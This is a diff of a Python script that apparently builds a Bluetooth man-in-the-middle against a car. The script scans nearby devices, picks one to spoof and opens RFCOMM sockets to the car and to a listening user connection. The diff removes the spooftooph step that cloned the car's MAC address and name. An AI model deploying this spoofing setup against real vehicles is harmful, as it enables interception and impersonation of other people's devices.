@@ -48,15 +48,10 @@ subprocess.Popen(['service', 'bluetooth', 'start'], stdout=subprocess.PIPE)
 subprocess.Popen(['hciconfig', 'hci0', 'up'], stdout=subprocess.PIPE)
 proc = subprocess.Popen(['hciconfig', 'hci1', 'up'], stdout=subprocess.PIPE)
 time.sleep(1)
-proc = subprocess.Popen(['hciconfig', 'hci0', '-a'], stdout=subprocess.PIPE)
-out, err = proc.communicate()
-adapter = raw_input("Which bluetooth adapter needs to be spoofed? ")
-#if "Broadcom" in out:
-    # Bluetooth adapter with modifyable MAC address is at hci0
-#    adapter = 'hci0'
-#else:
-    # Bluetooth adapter is at hci1
-#    adapter = 'hci1'
+
+adapter = raw_input("Which bluetooth adapter is spoofed? ")
+subprocess.Popen(['hciconfig', adapter, 'down'], stdout=subprocess.PIPE)
+time.sleep(1)
 
 # Scan for discoverable bluetooth devices
 nearby_devices = {}
@@ -72,21 +67,17 @@ for name, addr in nearby_devices:
 device = input("\nWhat device do you want to spoof (car)? ")
 (car_mac, car_name) = nearby_devices[device-1]
 
-# Replicate selected device
-proc = subprocess.Popen(['spooftooph', '-i', adapter, '-a', car_mac, '-n', car_name], stdout=subprocess.PIPE)
-out, err = proc.communicate()
-print(out)
-proc = subprocess.Popen(['hciconfig', adapter, 'reset'], stdout=subprocess.PIPE)
-time.sleep(1)
 # deactivate spoofed adapter until we manage to pair with the car
-proc = subprocess.Popen(['hciconfig', adapter, 'down'], stdout=subprocess.PIPE)
-time.sleep(1)
+time.sleep(2)
 
 # Pair to the car
 
 # Socket for communication with the car (client)
 car_socket=BluetoothSocket( RFCOMM )
+
 # Socket to listen for user connection (server)
+subprocess.Popen(['hciconfig', adapter, 'up'], stdout=subprocess.PIPE)
+time.sleep(2)
 user_socket=BluetoothSocket( RFCOMM )
 
 # Attempt to connect to the car on port 1
